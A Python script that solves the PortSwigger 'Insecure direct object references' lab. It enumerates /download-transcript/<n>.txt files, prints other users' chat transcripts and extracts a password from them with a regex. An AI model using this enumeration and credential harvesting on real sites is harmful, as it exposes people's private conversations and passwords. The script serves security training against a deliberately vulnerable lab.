#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Insecure direct object references".

Chat transcripts are served from /download-transcript/<n>.txt as static
files with no access control, so any user can read any transcript by
changing the number. This script enumerates the transcripts and harvests
every one it can reach; carlos's contains his password.

Lab: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import argparse
import re
import sys

import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# How many transcript IDs to try.
MAX_ID = 20


def fetch(path, method="GET", allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, timeout=REQUEST_TIMEOUT,
                           allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_idor():
    print(f"[*] Enumerating transcripts 1-{MAX_ID}...")
    found_any = False
    password = None
    for transcript_id in range(1, MAX_ID + 1):
        response = fetch(f"download-transcript/{transcript_id}.txt")
        if response.status_code != 200:
            continue

        found_any = True
        print(f"[+] Accessible transcript found: {transcript_id}.txt\n")
        print(f"--- transcript {transcript_id}.txt ---")
        print(response.text.strip())
        print()

        # A transcript may reveal a password in the chat ("my password is X").
        match = re.search(r"password is (\w+)", response.text)
        if match:
            password = match.group(1)

    if password:
        report("IDOR", True, f"recovered password: {password}")
    elif found_any:
        report("IDOR", True, "transcripts harvested (no password found in them)")
    else:
        report("IDOR", False, "no transcripts accessible")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Enumerate and harvest chat transcripts via IDOR (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_idor()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()